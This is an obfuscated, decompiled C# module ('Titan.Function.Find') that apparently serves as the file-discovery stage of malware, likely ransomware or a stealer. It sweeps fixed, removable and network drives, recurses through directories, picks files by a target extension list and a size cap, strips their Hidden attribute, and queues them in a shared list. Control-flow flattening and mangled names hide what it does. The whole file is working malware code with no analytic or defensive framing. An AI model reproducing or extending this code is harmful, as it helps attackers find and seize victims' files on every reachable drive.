using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using _562a9e40;
using _6359dd79;
using a92b0bd1;

namespace Titan.Function;

internal class Find
{
	private static List<DirectoryInfo> Directories = new List<DirectoryInfo>();

	public static void Process()
	{
		try
		{
			List<Thread> list = new List<Thread>();
			Thread thread4 = default(Thread);
			Thread thread2 = default(Thread);
			_003C_003Ec__DisplayClass1_0 _003C_003Ec__DisplayClass1_ = default(_003C_003Ec__DisplayClass1_0);
			while (true)
			{
				IL_0006:
				int num = 144089059;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._20f05200(num)) % 5u)
					{
					case 3u:
						break;
					case 1u:
					{
						Thread thread3 = _5b875f58.b8513f77((ThreadStart)delegate
						{
							List<DirectoryInfo> list2 = new List<DirectoryInfo>();
							DriveInfo driveInfo = default(DriveInfo);
							string[] array = default(string[]);
							int num12 = default(int);
							DirectoryInfo current2 = default(DirectoryInfo);
							while (true)
							{
								int num8 = 180419993;
								while (true)
								{
									int num9;
									switch ((uint)(num9 = _003CModule_003E._2ad3be74(num8)) % 17u)
									{
									case 4u:
										break;
									case 13u:
									{
										int num15;
										int num16;
										if (_003CModule_003E._0001_001B_0011Çm(driveInfo) == DriveType.Removable)
										{
											num15 = -37996034;
											num16 = num15;
										}
										else
										{
											num15 = 2122528856;
											num16 = num15;
										}
										num8 = num15 ^ (num9 * -641706020);
										continue;
									}
									case 2u:
									{
										int num21;
										int num22;
										if (_003CModule_003E.ìÆæ_00A4_0013(driveInfo))
										{
											num21 = 1069853715;
											num22 = num21;
										}
										else
										{
											num21 = -53916332;
											num22 = num21;
										}
										num8 = num21 ^ (num9 * 98880141);
										continue;
									}
									case 0u:
										if (list2.Count > 0)
										{
											num8 = (num9 * -1507741744) ^ -1537553368;
											continue;
										}
										return;
									case 12u:
									{
										int num18;
										if (_003CModule_003E._0001_001B_0011Çm(driveInfo) == DriveType.Fixed)
										{
											num8 = -1130735387;
											num18 = num8;
										}
										else
										{
											num8 = 952634239;
											num18 = num8;
										}
										continue;
									}
									case 3u:
									{
										int num23;
										int num24;
										if (_003CModule_003E._0001_001B_0011Çm(driveInfo) != DriveType.Network)
										{
											num23 = 2014164785;
											num24 = num23;
										}
										else
										{
											num23 = -239615112;
											num24 = num23;
										}
										num8 = num23 ^ (num9 * -34173099);
										continue;
									}
									case 6u:
										driveInfo = _003CModule_003E.ø_0096_001F_00B6_00F7(array[num12]);
										num8 = -765370561;
										continue;
									case 15u:
									{
										int num14;
										if (_003CModule_003E._0001_001B_0011Çm(driveInfo) == DriveType.Unknown)
										{
											num8 = 891301036;
											num14 = num8;
										}
										else
										{
											num8 = 327704805;
											num14 = num8;
										}
										continue;
									}
									case 1u:
										num8 = (num9 * -1605851096) ^ -1923176759;
										continue;
									case 16u:
										list2.Add(_003CModule_003E._005EßòìÀ(driveInfo));
										num8 = (num9 * -1469891328) ^ -1369742420;
										continue;
									case 14u:
									{
										int num19;
										int num20;
										if (_003CModule_003E._0001_001B_0011Çm(driveInfo) != DriveType.CDRom)
										{
											num19 = 641108985;
											num20 = num19;
										}
										else
										{
											num19 = -993435545;
											num20 = num19;
										}
										num8 = num19 ^ (num9 * 441775382);
										continue;
									}
									case 7u:
									{
										int num17;
										if (_003CModule_003E.ÆWÝG_008A(_003CModule_003E._005DÜ_00B2_000Cn(_003CModule_003E.zz_005B_005DA(_003CModule_003E._005DÜ_00B2_000Cn(_003CModule_003E._005EßòìÀ(driveInfo)))), _003CModule_003E._005DÜ_00B2_000Cn(_003CModule_003E.zz_005B_005DA(_003CModule_003E.µßË_0023C(_003CModule_003E.ÇV0_0004_0004())))))
										{
											num8 = -1291796561;
											num17 = num8;
										}
										else
										{
											num8 = 891301036;
											num17 = num8;
										}
										continue;
									}
									case 8u:
										array = _003CModule_003E.ñÑ_0096e_0028();
										num8 = (num9 * 1977004137) ^ 0x3075A84E;
										continue;
									case 11u:
									{
										int num13;
										if (num12 >= array.Length)
										{
											num8 = 1471362068;
											num13 = num8;
										}
										else
										{
											num8 = 1926648830;
											num13 = num8;
										}
										continue;
									}
									case 5u:
										num12++;
										num8 = 1559662233;
										continue;
									case 10u:
										num12 = 0;
										num8 = (num9 * 180050334) ^ -280198770;
										continue;
									default:
									{
										using List<DirectoryInfo>.Enumerator enumerator3 = list2.GetEnumerator();
										while (true)
										{
											int num10;
											int num11;
											if (enumerator3.MoveNext())
											{
												num10 = 974871719;
												num11 = num10;
											}
											else
											{
												num10 = 992299548;
												num11 = num10;
											}
											while (true)
											{
												switch ((uint)(num9 = _003CModule_003E._2ad3be74(num10)) % 6u)
												{
												case 4u:
													num10 = 974871719;
													continue;
												default:
													return;
												case 1u:
													current2 = enumerator3.Current;
													num10 = 1395313815;
													continue;
												case 5u:
													Directories.Add(current2);
													num10 = (num9 * 1177077584) ^ 0x59520E42;
													continue;
												case 0u:
													searchDirectories(current2);
													num10 = (num9 * 742925841) ^ -981831157;
													continue;
												case 3u:
													break;
												case 2u:
													return;
												}
												break;
											}
										}
									}
									}
									break;
								}
							}
						});
						_114a3b06.c7844788(thread3, true);
						thread4 = thread3;
						num = 209784342;
						continue;
					}
					case 0u:
						_003CModule_003E.s_0029_009F_0028_00A7(thread4);
						num = (num2 * 605553425) ^ 0x1BFAFDF1;
						continue;
					case 2u:
						list.Add(thread4);
						num = (num2 * 1183989955) ^ -1194291054;
						continue;
					default:
					{
						using (List<DirectoryInfo>.Enumerator enumerator = Data.searchDir.GetEnumerator())
						{
							while (true)
							{
								IL_0117:
								int num3;
								int num4;
								if (!enumerator.MoveNext())
								{
									num3 = 268112144;
									num4 = num3;
								}
								else
								{
									num3 = 357619125;
									num4 = num3;
								}
								while (true)
								{
									switch ((uint)(num2 = _003CModule_003E._20f05200(num3)) % 9u)
									{
									case 0u:
										num3 = 357619125;
										continue;
									default:
										goto end_IL_00aa;
									case 7u:
										_003CModule_003E.s_0029_009F_0028_00A7(thread2);
										num3 = (num2 * -1261599902) ^ -153080998;
										continue;
									case 4u:
										list.Add(thread2);
										num3 = (num2 * -1367220865) ^ -2140198998;
										continue;
									case 6u:
										break;
									case 5u:
										Directories.Add(_003C_003Ec__DisplayClass1_.dir);
										num3 = (num2 * -1712195882) ^ -1027740194;
										continue;
									case 1u:
										_003C_003Ec__DisplayClass1_.dir = enumerator.Current;
										num3 = (num2 * -2034394478) ^ 0x79CB5854;
										continue;
									case 3u:
										_003C_003Ec__DisplayClass1_ = new _003C_003Ec__DisplayClass1_0();
										num3 = -393039259;
										continue;
									case 8u:
									{
										Thread thread = _003CModule_003E.Ýú_00AE_0099_000B(_003C_003Ec__DisplayClass1_._003CProcess_003Eb__2);
										_114a3b06.c7844788(thread, true);
										thread2 = thread;
										num3 = (num2 * -1354911808) ^ -808566451;
										continue;
									}
									case 2u:
										goto end_IL_00aa;
									}
									goto IL_0117;
									continue;
									end_IL_00aa:
									break;
								}
								break;
							}
						}
						foreach (Thread item in list)
						{
							try
							{
								_003CModule_003E._00B8n_007Ddn(item);
							}
							catch
							{
								while (true)
								{
									IL_01eb:
									int num5 = -542249536;
									while (true)
									{
										switch ((uint)(num2 = _003CModule_003E._20f05200(num5)) % 3u)
										{
										case 0u:
											break;
										default:
											goto end_IL_01f0;
										case 1u:
											goto IL_020d;
										case 2u:
											goto end_IL_01f0;
										}
										goto IL_01eb;
										IL_020d:
										_003CModule_003E.ùØs_00BF_0060(item);
										num5 = (num2 * 2140780424) ^ -109557476;
										continue;
										end_IL_01f0:
										break;
									}
									break;
								}
							}
						}
						goto end_IL_000b;
					}
					}
					goto IL_0006;
					continue;
					end_IL_000b:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		int count = Directories.Count;
		ParallelOptions parallelOptions = _003CModule_003E._0019ãìl_00B4();
		e07aa4ce.c2f2cb73(parallelOptions, _003CModule_003E._0093Û_008A_005D_008E());
		_5ed6505f._04cbdaa1(0, count, parallelOptions, (Action<int>)delegate(int i)
		{
			try
			{
				searchFiles(Directories[i]);
			}
			catch
			{
				while (true)
				{
					int num6 = -694495847;
					while (true)
					{
						int num7;
						switch ((uint)(num7 = _003CModule_003E._2ad3be74(num6)) % 3u)
						{
						case 2u:
							break;
						default:
							return;
						case 1u:
							goto IL_0034;
						case 0u:
							return;
						}
						break;
						IL_0034:
						_003CModule_003E.ùØs_00BF_0060(_003CModule_003E.i_00B3_0026_007Eð());
						num6 = (num7 * -414979961) ^ -1455636178;
					}
				}
			}
		});
	}

	private static void searchDirectories(DirectoryInfo startDirectory)
	{
		try
		{
			DirectoryInfo[] array = _003CModule_003E._002DJÇ_00B0_0018(startDirectory);
			DirectoryInfo directoryInfo = default(DirectoryInfo);
			bool flag = default(bool);
			int num3 = default(int);
			while (true)
			{
				int num = -1056760250;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._20f05200(num)) % 16u)
					{
					case 6u:
						break;
					default:
						return;
					case 7u:
						searchDirectories(directoryInfo);
						num = (num2 * -941786261) ^ -1345202313;
						continue;
					case 3u:
						num = (num2 * 539189584) ^ 0x5F70DFC2;
						continue;
					case 14u:
					{
						int num10;
						if (flag)
						{
							num = 507189871;
							num10 = num;
						}
						else
						{
							num = -640474326;
							num10 = num;
						}
						continue;
					}
					case 8u:
						directoryInfo = array[num3];
						num = -718450531;
						continue;
					case 2u:
					{
						int num6;
						int num7;
						if (Directories.Contains(directoryInfo))
						{
							num6 = -1387554628;
							num7 = num6;
						}
						else
						{
							num6 = -1994950966;
							num7 = num6;
						}
						num = num6 ^ (num2 * 123691555);
						continue;
					}
					case 5u:
					{
						int num11;
						if (num3 >= array.Length)
						{
							num = 196279913;
							num11 = num;
						}
						else
						{
							num = -1271711611;
							num11 = num;
						}
						continue;
					}
					case 10u:
					{
						int num12;
						int num13;
						if (_003CModule_003E._002DJÇ_00B0_0018(directoryInfo).Length != 0)
						{
							num12 = -1959889458;
							num13 = num12;
						}
						else
						{
							num12 = -1924923984;
							num13 = num12;
						}
						num = num12 ^ (num2 * 1831022257);
						continue;
					}
					case 1u:
					{
						int num8;
						int num9;
						if (_003CModule_003E._00B4_002Eü_0095_0099(directoryInfo) != FileAttributes.Hidden)
						{
							num8 = 253879660;
							num9 = num8;
						}
						else
						{
							num8 = -1276795499;
							num9 = num8;
						}
						num = num8 ^ (num2 * 62360077);
						continue;
					}
					case 15u:
						Directories.Add(directoryInfo);
						num = (num2 * -1016336931) ^ -245774156;
						continue;
					case 11u:
						flag = false;
						num = -100256885;
						continue;
					case 0u:
						flag = true;
						num = (num2 * 1458244161) ^ 0x777BB0DE;
						continue;
					case 4u:
					{
						int num4;
						int num5;
						if (_003CModule_003E._00B4_002Eü_0095_0099(directoryInfo) != FileAttributes.System)
						{
							num4 = 1918361051;
							num5 = num4;
						}
						else
						{
							num4 = -2002971832;
							num5 = num4;
						}
						num = num4 ^ (num2 * 1969071412);
						continue;
					}
					case 9u:
						num3 = 0;
						num = (num2 * -293075379) ^ 0x41B8BFD5;
						continue;
					case 13u:
						num3++;
						num = -1150701006;
						continue;
					case 12u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	private static void searchFiles(DirectoryInfo startDirectory)
	{
		//Discarded unreachable code: IL_013c
		try
		{
			FileInfo[] array = _003CModule_003E.i_0022_00A5_007CÌ(startDirectory);
			bool flag = default(bool);
			FileInfo fileInfo = default(FileInfo);
			int num7 = default(int);
			string current = default(string);
			while (true)
			{
				int num = -904062846;
				while (true)
				{
					int num8;
					int num2;
					switch ((uint)(num2 = _003CModule_003E._20f05200(num)) % 12u)
					{
					case 11u:
						break;
					case 0u:
						flag = true;
						num = (num2 * 471696815) ^ -1774370055;
						continue;
					case 8u:
					{
						int num16;
						int num17;
						if (_003CModule_003E._00BEÓ_0089_00D73(_003CModule_003E.r_009E_00AE_0098ú(fileInfo), ""))
						{
							num16 = -460661541;
							num17 = num16;
						}
						else
						{
							num16 = -1450302210;
							num17 = num16;
						}
						num = num16 ^ (num2 * -868315129);
						continue;
					}
					case 6u:
						flag = false;
						num = (num2 * 1120584343) ^ 0x2F328A2C;
						continue;
					case 1u:
						num7 = 0;
						num = (num2 * -1991827089) ^ -833493961;
						continue;
					case 5u:
						flag = false;
						num = (num2 * 2062289227) ^ -1670121453;
						continue;
					case 2u:
						fileInfo = array[num7];
						num = -218611999;
						continue;
					case 9u:
					{
						int num15;
						if (_003CModule_003E._00B4_002Eü_0095_0099(fileInfo) == FileAttributes.System)
						{
							num = -895189917;
							num15 = num;
						}
						else
						{
							num = 59520489;
							num15 = num;
						}
						continue;
					}
					case 4u:
					{
						int num14;
						if (_003CModule_003E.ºJ6_0089_0005(fileInfo) <= 204857600)
						{
							num = -1209813796;
							num14 = num;
						}
						else
						{
							num = 175226378;
							num14 = num;
						}
						continue;
					}
					case 10u:
						flag = false;
						num = (num2 * -1012714705) ^ 0x29F87353;
						continue;
					default:
					{
						using (List<string>.Enumerator enumerator = Data.goodExtensions.GetEnumerator())
						{
							while (true)
							{
								IL_01c2:
								int num3;
								int num4;
								if (enumerator.MoveNext())
								{
									num3 = 294460140;
									num4 = num3;
								}
								else
								{
									num3 = -98814494;
									num4 = num3;
								}
								while (true)
								{
									switch ((uint)(num2 = _003CModule_003E._20f05200(num3)) % 6u)
									{
									case 2u:
										num3 = 294460140;
										continue;
									default:
										goto end_IL_0177;
									case 5u:
										current = enumerator.Current;
										num3 = 631600589;
										continue;
									case 4u:
										flag = false;
										num3 = (num2 * 1736178694) ^ -1863134488;
										continue;
									case 1u:
										break;
									case 0u:
									{
										int num5;
										int num6;
										if (_003CModule_003E._00BEÓ_0089_00D73(_003CModule_003E.r_009E_00AE_0098ú(fileInfo), current))
										{
											num5 = -373467385;
											num6 = num5;
										}
										else
										{
											num5 = -1043853692;
											num6 = num5;
										}
										num3 = num5 ^ (num2 * 1159918095);
										continue;
									}
									case 3u:
										goto end_IL_0177;
									}
									goto IL_01c2;
									continue;
									end_IL_0177:
									break;
								}
								break;
							}
						}
						if (_003CModule_003E._00B4_002Eü_0095_0099(fileInfo) != FileAttributes.Hidden)
						{
							goto IL_0230;
						}
						goto IL_0282;
					}
					case 3u:
						goto IL_02c1;
						IL_0282:
						_003CModule_003E._00ADu_0012_0006b(_003CModule_003E._005DÜ_00B2_000Cn(fileInfo), FileAttributes.Normal);
						num8 = -1028273108;
						goto IL_0235;
						IL_0235:
						while (true)
						{
							switch ((uint)(num2 = _003CModule_003E._20f05200(num8)) % 9u)
							{
							case 8u:
								break;
							default:
								return;
							case 3u:
								goto IL_026e;
							case 5u:
								goto IL_0282;
							case 2u:
								Data.Files.Add(fileInfo);
								num8 = (num2 * 1997860949) ^ 0x2F42B233;
								continue;
							case 4u:
								goto IL_02c1;
							case 6u:
							{
								int num11;
								int num12;
								if (_003CModule_003E._00B4_002Eü_0095_0099(fileInfo) == FileAttributes.Archive)
								{
									num11 = 1462005881;
									num12 = num11;
								}
								else
								{
									num11 = -1619054829;
									num12 = num11;
								}
								num8 = num11 ^ (num2 * 1695244979);
								continue;
							}
							case 0u:
								num7++;
								num8 = -1197715090;
								continue;
							case 1u:
							{
								int num9;
								int num10;
								if (_003CModule_003E._00B4_002Eü_0095_0099(fileInfo) == FileAttributes.ReadOnly)
								{
									num9 = 2034391682;
									num10 = num9;
								}
								else
								{
									num9 = 1347754118;
									num10 = num9;
								}
								num8 = num9 ^ (num2 * -708546777);
								continue;
							}
							case 7u:
								return;
							}
							break;
							IL_026e:
							int num13;
							if (!flag)
							{
								num8 = -1277232621;
								num13 = num8;
							}
							else
							{
								num8 = 694134173;
								num13 = num8;
							}
						}
						goto IL_0230;
						IL_02c1:
						if (num7 < array.Length)
						{
							goto case 2u;
						}
						num8 = 430783364;
						goto IL_0235;
						IL_0230:
						num8 = -734191463;
						goto IL_0235;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}
}
